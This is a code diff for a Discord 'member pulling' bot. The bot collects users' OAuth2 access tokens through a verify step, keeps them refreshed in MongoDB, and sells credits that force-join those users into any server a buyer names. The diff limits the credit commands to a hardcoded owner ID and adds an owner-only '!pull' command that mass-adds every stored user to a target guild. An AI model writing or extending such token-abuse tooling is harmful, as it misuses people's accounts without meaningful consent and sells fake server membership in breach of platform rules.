@@ -22,8 +22,11 @@ const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
 const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
 const MONGO_URI = process.env.MONGO_URI;
 
-// Direct Discord CDN Link for Embed Banner Artwork
-const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1461334969711460587/1568896573084008469/banner.png';
+// Your exact exclusive owner Discord ID
+const OWNER_ID = '1370594462941581433';
+
+// Direct CDN Image URL for Panel & Verify embeds
+const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';
 
 if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
   console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
@@ -37,7 +40,6 @@ mongoose.connect(MONGO_URI)
   .then(() => console.log("⚡ [DATABASE] Connected to MongoDB Atlas successfully!"))
   .catch(err => console.error("❌ [DATABASE ERROR]:", err));
 
-// Verified OAuth2 Tokens Collection
 const userSchema = new mongoose.Schema({
   discordId: { type: String, required: true, unique: true },
   username: String,
@@ -48,14 +50,12 @@ const userSchema = new mongoose.Schema({
 }, { collection: 'verifiedusers' });
 const VerifiedUser = mongoose.model('VerifiedUser', userSchema);
 
-// User Credit Balances Collection (Dedicated to user allocation)
 const creditSchema = new mongoose.Schema({
   discordId: { type: String, required: true, unique: true },
   balance: { type: Number, default: 0 }
 }, { collection: 'usercredits' });
 const UserCredit = mongoose.model('UserCredit', creditSchema);
 
-// Active interactive sessions map
 const activeSessions = new Map();
 
 // ==================== EXPRESS WEB SERVER SETUP ====================
@@ -186,7 +186,7 @@ client.once('clientReady', () => {
   console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
 });
 
-// ==================== BACKGROUND TOKEN REFRESH GUARDIAN ====================
+// Background Token Refresh Guardian
 setInterval(async () => {
   try {
     const users = await VerifiedUser.find({});
@@ -217,7 +217,7 @@ client.on('messageCreate', async (message) => {
   const args = message.content.slice(prefix.length).trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
-  // 1. !verify command -> Sends embed with banner image
+  // 1. !verify command
   if (command === 'verify') {
     const embed = new EmbedBuilder()
       .setColor(0x7000ff)
@@ -236,7 +236,7 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed], components: [row] });
   }
 
-  // 2. !panel command -> Sends Purchase Ticket Panel with Banner Image
+  // 2. !panel command
   if (command === 'panel') {
     if (!message.member.permissions.has('Administrator')) {
       return message.reply('❌ Access Denied: Administrator permissions required.');
@@ -258,10 +258,10 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed], components: [row] });
   }
 
-  // 3. !gc command -> Only Admin can grant credits (Capped strictly by DB verified stock)
+  // 3. !gc command -> OWNER ONLY (Strictly your ID: 1370594462941581433)
   if (command === 'gc') {
-    if (!message.member.permissions.has('Administrator')) {
-      return message.reply('❌ Access Denied: Only administrators can grant credits.');
+    if (message.author.id !== OWNER_ID) {
+      return message.reply('❌ Access Denied: Only the bot owner can issue credits.');
     }
 
     const targetUser = message.mentions.users.first();
@@ -287,7 +287,7 @@ client.on('messageCreate', async (message) => {
     const embed = new EmbedBuilder()
       .setColor(0x10b981)
       .setTitle('📦 Credits Issued!')
-      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account!`)
+      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account by the owner!`)
       .addFields(
         { name: 'Current User Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
         { name: 'Database Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
@@ -297,10 +297,10 @@ client.on('messageCreate', async (message) => {
     return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
   }
 
-  // 4. !rc command -> Admin Credit Removal (`!rc @user 500`)
+  // 4. !rc command -> OWNER ONLY
   if (command === 'rc') {
-    if (!message.member.permissions.has('Administrator')) {
-      return message.reply('❌ Access Denied.');
+    if (message.author.id !== OWNER_ID) {
+      return message.reply('❌ Access Denied: Only the bot owner can remove credits.');
     }
 
     const targetUser = message.mentions.users.first();
@@ -330,9 +330,9 @@ client.on('messageCreate', async (message) => {
     return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
   }
 
-  // 5. !resetcredits command -> Wipe user balance entirely
+  // 5. !resetcredits command -> OWNER ONLY
   if (command === 'resetcredits') {
-    if (!message.member.permissions.has('Administrator')) return message.reply('❌ Access Denied.');
+    if (message.author.id !== OWNER_ID) return message.reply('❌ Access Denied.');
     const targetUser = message.mentions.users.first();
     if (!targetUser) return message.reply('❌ Usage: `!resetcredits @user`');
 
@@ -340,7 +340,69 @@ client.on('messageCreate', async (message) => {
     return message.reply(`✨ Successfully wiped all credits for <@${targetUser.id}>.`);
   }
 
-  // 6. !bal command -> Check Balance (`!bal` or `!bal @user`)
+  // 6. !pull command -> OWNER ONLY (The classic manual direct pull command)
+  if (command === 'pull') {
+    if (message.author.id !== OWNER_ID) {
+      return message.reply('❌ Access Denied: Only the bot owner can run manual pull protocols.');
+    }
+
+    const targetGuildId = args[0];
+    if (!targetGuildId) {
+      return message.reply('❌ Error: Please provide a target Guild ID. Usage: `!pull <GUILD_ID> [LIMIT]`');
+    }
+
+    const pullLimit = args[1] ? parseInt(args[1], 10) : null;
+    const statusMsg = await message.reply(`🚀 **Owner Protocol:** Synchronizing database tokens into target \`${targetGuildId}\`...\n*Please wait...*`);
+
+    try {
+      const targetGuild = await client.guilds.fetch(targetGuildId);
+      const verifiedUsers = await VerifiedUser.find({});
+      if (verifiedUsers.length === 0) {
+        return statusMsg.edit('⚠️ **Abyssal Warning:** No verified users found in MongoDB storage.');
+      }
+
+      let successfulJoins = 0;
+      let alreadyInServer = 0;
+      let failedJoins = 0;
+      const startTimePull = Date.now();
+
+      for (const userRecord of verifiedUsers) {
+        if (pullLimit && successfulJoins >= pullLimit) break;
+        try {
+          const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
+          if (member) {
+            alreadyInServer++;
+            continue;
+          }
+
+          await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
+          successfulJoins++;
+          await new Promise(r => setTimeout(r, 600));
+        } catch (err) {
+          failedJoins++;
+        }
+      }
+
+      const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
+      const reportEmbed = new EmbedBuilder()
+        .setColor(0x10b981)
+        .setTitle('🔥 ABYSSAL // Manual Pull Execution Report')
+        .addFields(
+          { name: '🎯 Target Guild ID', value: `\`${targetGuildId}\``, inline: false },
+          { name: '✅ Successful Joins', value: `\`${successfulJoins}\``, inline: true },
+          { name: '🔄 Already in Server', value: `\`${alreadyInServer}\``, inline: true },
+          { name: '❌ Failed / Expired', value: `\`${failedJoins}\``, inline: true },
+          { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
+        )
+        .setTimestamp();
+
+      return statusMsg.edit({ content: null, embeds: [reportEmbed] });
+    } catch (err) {
+      return statusMsg.edit('❌ Critical error executing manual pull protocol.');
+    }
+  }
+
+  // 7. !bal command
   if (command === 'bal' || command === 'balance') {
     const targetUser = message.mentions.users.first() || message.author;
     let uc = await UserCredit.findOne({ discordId: targetUser.id });
@@ -357,7 +419,7 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed] });
   }
 
-  // 7. !stock command -> Check Stock
+  // 8. !stock command
   if (command === 'stock') {
     const totalStock = await VerifiedUser.countDocuments();
     const embed = new EmbedBuilder()
@@ -373,7 +435,7 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed] });
   }
 
-  // 8. !stats command -> Cyberpunk Neural Telemetry Matrix
+  // 9. !stats command
   if (command === 'stats') {
     const totalUsers = await VerifiedUser.countDocuments();
     const uptimeMs = Date.now() - startTime;
@@ -439,20 +501,18 @@ client.on('interactionCreate', async (interaction) => {
         .setRequired(true);
 
       modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
-      return interaction.showModal(modal);
+      return await interaction.showModal(modal);
     }
 
     if (interaction.customId === 'btn_confirm_purchase') {
       const session = activeSessions.get(interaction.user.id);
       if (!session) return interaction.reply({ content: '❌ Session expired. Please start again.', ephemeral: true });
 
-      // Verify User Credit Balance before running execution
       let uc = await UserCredit.findOne({ discordId: interaction.user.id });
       if (!uc || uc.balance < session.quantity) {
         return interaction.update({ content: `❌ Insufficient credits. You need **${session.quantity}** credits, but your balance is **${uc ? uc.balance : 0}**.`, embeds: [], components: [] });
       }
 
-      // DEDUCT CREDITS IMMEDIATELY
       uc.balance -= session.quantity;
       await uc.save();
 
@@ -468,7 +528,7 @@ client.on('interactionCreate', async (interaction) => {
           if (successful >= session.quantity) break;
           try {
             const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
-            if (member) continue; // Skip if already in target server
+            if (member) continue;
 
             await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
             successful++;
@@ -515,7 +575,6 @@ client.on('interactionCreate', async (interaction) => {
 
       const totalStock = await VerifiedUser.countDocuments();
 
-      // Show Quantity Input Modal
       const modal = new ModalBuilder()
         .setCustomId('modal_quantity')
         .setTitle('Buy Members');
@@ -528,7 +587,7 @@ client.on('interactionCreate', async (interaction) => {
         .setRequired(true);
 
       modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
-      return interaction.showModal(modal);
+      return await interaction.showModal(modal);
     }
 
     if (interaction.customId === 'modal_quantity') {
@@ -562,7 +621,7 @@ client.on('interactionCreate', async (interaction) => {
         .setTitle(`Confirm Addition — Member Sync`)
         .addFields(
           { name: '🏰 Target Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
-          { name: '📦 Available Stock', value: `${totalStock}`, inline: true },
+          { name: '📦 Available DB Stock', value: `${totalStock}`, inline: true },
           { name: '🔢 Add Count', value: `${quantity}`, inline: true },
           { name: '💵 Cost', value: `${quantity} Credits`, inline: true },
           { name: '💳 Your Balance', value: `${userBalance} Credits`, inline: true }
